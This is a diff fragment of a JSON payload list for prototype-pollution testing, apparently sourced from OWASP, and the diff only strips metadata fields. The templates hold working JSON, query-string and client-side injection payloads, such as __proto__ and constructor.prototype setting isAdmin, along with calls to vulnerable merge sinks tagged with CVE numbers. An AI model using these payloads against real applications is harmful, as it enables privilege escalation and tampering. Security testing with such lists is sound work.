-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Deeper constructor climbing (constructor.constructor) probe from OWASP. Tests application handling of: {\"constructor\": {\"prototype\": ..."
   },
   {
     "id": "prototype-pollution-owasp-0061",
     "name": "Deeper constructor climbing (constructor.constructor) #2",
     "template": "{\"a\": {\"constructor\": {\"prototype\": {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}}}}",
-    "description": "Deeper constructor climbing (constructor.constructor) probe from OWASP. Tests application handling of: {\"a\": {\"constructor\": {\"protot...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Deeper constructor climbing (constructor.constructor) probe from OWASP. Tests application handling of: {\"a\": {\"constructor\": {\"protot..."
   },
   {
     "id": "prototype-pollution-owasp-0062",
     "name": "qs / querystring nested DOT parse forms (vs bracket forms...",
     "template": "?__proto__.isAdmin=true",
-    "description": "qs / querystring nested DOT parse forms (vs bracket forms above) probe from OWASP. Tests application handling of: ?__proto__.isAdmin=true",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "qs / querystring nested DOT parse forms (vs bracket forms above) probe from OWASP. Tests application handling of: ?__proto__.isAdmin=true"
   },
   {
     "id": "prototype-pollution-owasp-0063",
     "name": "qs / querystring nested DOT parse forms (vs bracket forms above) #2",
     "template": "?__proto__.secret=attacker-controlled",
-    "description": "qs / querystring nested DOT parse forms (vs bracket forms above) probe from OWASP. Tests application handling of: ?__proto__.secret=attacker-con...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "qs / querystring nested DOT parse forms (vs bracket forms above) probe from OWASP. Tests application handling of: ?__proto__.secret=attacker-con..."
   },
   {
     "id": "prototype-pollution-owasp-0064",
     "name": "qs / querystring nested DOT parse forms (vs bracket forms above) #3",
     "template": "?constructor.prototype.polluted=true",
-    "description": "qs / querystring nested DOT parse forms (vs bracket forms above) probe from OWASP. Tests application handling of: ?constructor.prototype.pollute...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "qs / querystring nested DOT parse forms (vs bracket forms above) probe from OWASP. Tests application handling of: ?constructor.prototype.pollute..."
   },
   {
     "id": "prototype-pollution-owasp-0065",
     "name": "Additional vulnerable merge / set sinks (CVE-referenced)",
     "template": "mixin-deep(target, payload)        # 'mixin-deep' < 1.3.2 (CVE-2019-10746)",
-    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: mixin-deep(target, payload)   ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: mixin-deep(target, payload)   ..."
   },
   {
     "id": "prototype-pollution-owasp-0066",
     "name": "Additional vulnerable merge / set sinks (CVE-referenced) #2",
     "template": "set-value(obj, '__proto__.x', 'y') # 'set-value' < 3.0.1 (CVE-2019-10747)",
-    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: set-value(obj, '__proto__.x', ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: set-value(obj, '__proto__.x', ..."
   },
   {
     "id": "prototype-pollution-owasp-0067",
     "name": "Additional vulnerable merge / set sinks (CVE-referenced) #3",
     "template": "dot-prop.set(obj, '__proto__.x', 'y') # 'dot-prop' < 4.2.1 / 5.1.1 (CVE-2020-8116 / CVE-2023-26136)",
-    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: dot-prop.set(obj, '__proto__.x...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: dot-prop.set(obj, '__proto__.x..."
   },
   {
     "id": "prototype-pollution-owasp-0068",
     "name": "Additional vulnerable merge / set sinks (CVE-referenced) #4",
     "template": "object-path.set(obj, ['__proto__','x'], 'y') # 'object-path' < 0.11.5 (CVE-2020-15256)",
-    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: object-path.set(obj, ['__proto...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: object-path.set(obj, ['__proto..."
   },
   {
     "id": "prototype-pollution-owasp-0069",
     "name": "Additional vulnerable merge / set sinks (CVE-referenced) #5",
     "template": "flat.merge(target, payload)         # 'flat' < 5.0.1 (CVE-2021-23440)",
-    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: flat.merge(target, payload)   ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: flat.merge(target, payload)   ..."
   },
   {
     "id": "prototype-pollution-owasp-0070",
     "name": "Additional vulnerable merge / set sinks (CVE-referenced) #6",
     "template": "dset(obj, '__proto__.x', 'y')       # 'dset' < 3.1.2 (CVE-2021-23352)",
-    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: dset(obj, '__proto__.x', 'y') ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: dset(obj, '__proto__.x', 'y') ..."
   },
   {
     "id": "prototype-pollution-owasp-0071",
     "name": "Additional vulnerable merge / set sinks (CVE-referenced) #7",
     "template": "deepmerge(target, payload)          # 'deepmerge' misconfig when merge prototype keys",
-    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: deepmerge(target, payload)    ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: deepmerge(target, payload)    ..."
   },
   {
     "id": "prototype-pollution-owasp-0072",
     "name": "Additional vulnerable merge / set sinks (CVE-referenced) #8",
     "template": "defu(target, payload)               # 'defu' / unflatten variants",
-    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: defu(target, payload)         ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Additional vulnerable merge / set sinks (CVE-referenced) probe from OWASP. Tests application handling of: defu(target, payload)         ..."
   },
   {
     "id": "prototype-pollution-owasp-0073",
     "name": "JSON5 / relaxed JSON parsers (unquoted keys)",
     "template": "{__proto__: {polluted: true}}      # JSON5 parse of unquoted object",
-    "description": "JSON5 / relaxed JSON parsers (unquoted keys) probe from OWASP. Tests application handling of: {__proto__: {polluted: true}} ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "JSON5 / relaxed JSON parsers (unquoted keys) probe from OWASP. Tests application handling of: {__proto__: {polluted: true}} ..."
   },
   {
     "id": "prototype-pollution-owasp-0074",
     "name": "JSON5 / relaxed JSON parsers (unquoted keys) #2",
     "template": "{constructor: {prototype: {admin: true}}}",
-    "description": "JSON5 / relaxed JSON parsers (unquoted keys) probe from OWASP. Tests application handling of: {constructor: {prototype: {adm...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "JSON5 / relaxed JSON parsers (unquoted keys) probe from OWASP. Tests application handling of: {constructor: {prototype: {adm..."
   },
   {
     "id": "prototype-pollution-owasp-0075",
     "name": "Array-based merge pollution (set-value / dset style)",
     "template": "{\"__proto__\": {\"0\": \"x\"}}",
-    "description": "Array-based merge pollution (set-value / dset style) probe from OWASP. Tests application handling of: {\"__proto__\": {\"0\": \"x\"}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Array-based merge pollution (set-value / dset style) probe from OWASP. Tests application handling of: {\"__proto__\": {\"0\": \"x\"}}"
   },
   {
     "id": "prototype-pollution-owasp-0076",
     "name": "Array-based merge pollution (set-value / dset style) #2",
     "template": "{\"arr\": {\"__proto__\": {\"length\": 999}}}",
-    "description": "Array-based merge pollution (set-value / dset style) probe from OWASP. Tests application handling of: {\"arr\": {\"__proto__\": {\"length...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Array-based merge pollution (set-value / dset style) probe from OWASP. Tests application handling of: {\"arr\": {\"__proto__\": {\"length..."
   },
   {
     "id": "prototype-pollution-owasp-0077",
     "name": "Client-side pollution via storage / cookie reflection",
     "template": "localStorage.setItem('__proto__', JSON.stringify({polluted: true}))  # reflected if parsed unsafely",
-    "description": "Client-side pollution via storage / cookie reflection probe from OWASP. Tests application handling of: localStorage.setItem('__proto_...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Client-side pollution via storage / cookie reflection probe from OWASP. Tests application handling of: localStorage.setItem('__proto_..."
   },
   {
     "id": "prototype-pollution-owasp-0078",
     "name": "Client-side pollution via storage / cookie reflection #2",
     "template": "document.cookie = \"__proto__=polluted\"   # if cookie->object merge is unsafe",
-    "description": "Client-side pollution via storage / cookie reflection probe from OWASP. Tests application handling of: document.cookie = \"__proto__=p...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Client-side pollution via storage / cookie reflection probe from OWASP. Tests application handling of: document.cookie = \"__proto__=p..."
   },
   {
     "id": "prototype-pollution-owasp-0079",
     "name": "Detection: pollute a Node require / module resolution chain",
     "template": "{\"__proto__\": {\"serveStatic\": \"evil-module\"}}",
-    "description": "Detection: pollute a Node require / module resolution chain probe from OWASP. Tests application handling of: {\"__proto__\": {\"serveStatic\": ...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "prototype-pollution-payloads.txt"
+    "description": "Detection: pollute a Node require / module resolution chain probe from OWASP. Tests application handling of: {\"__proto__\": {\"serveStatic\": ..."
   }
 ]
